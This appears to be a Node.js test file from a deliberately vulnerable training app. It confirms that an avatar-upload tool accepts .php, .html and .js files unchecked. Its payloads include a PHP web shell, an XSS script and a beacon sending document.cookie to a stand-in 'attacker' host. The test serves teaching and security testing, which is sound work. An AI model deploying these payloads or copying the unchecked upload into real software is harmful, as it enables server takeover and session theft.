const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const fs = require('node:fs');
const { seedShop, seedAgents, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability file-upload-extension-bypass
 * @teaches OWASP-Web:A03
 * @location agent-host/agents/uploads/tools/index.js
 *
 * .php, .html, .js all get accepted with no extension check.
 */
test('file-upload-extension-bypass: .php .html .js all accepted verbatim', async t => {
  const s = await seedShop();
  t.after(async () => { await s.close(); });
  const a = await seedAgents();
  t.after(async () => { await a.close(); });
  purgeToolCaches();
  const written = [];
  try {
    const uploads = require(path.join(REPO, 'agent-host/agents/uploads/tools/index.js'));
    const payloads = [
      { name: 'shell.php', body: '<?php system($_GET["c"]); ?>' },
      { name: 'xss.html',  body: '<html><script>alert(1)</script></html>' },
      { name: 'beacon.js', body: 'fetch("http://attacker/?c=" + document.cookie)' },
    ];
    for (const p of payloads) {
      const up = uploads.upload_avatar({
        user_id: 1,
        file_bytes_base64: Buffer.from(p.body).toString('base64'),
        filename: p.name,
        mime: 'text/plain',   // MIME lies — but tool trusts filename
      });
      assert.equal(up.ok, true, `${p.name} must be accepted`);
      // Extension preserved on disk (that's the surface)
      assert.match(up.written_path, new RegExp(path.extname(p.name).replace('.', '\\.') + '$'));
      written.push(up.written_path);
      // Body persisted verbatim
      const readBack = fs.readFileSync(up.written_path, 'utf8');
      assert.equal(readBack, p.body);
    }
  } finally {
    for (const p of written) { try { fs.unlinkSync(p); } catch {} }
  }
});
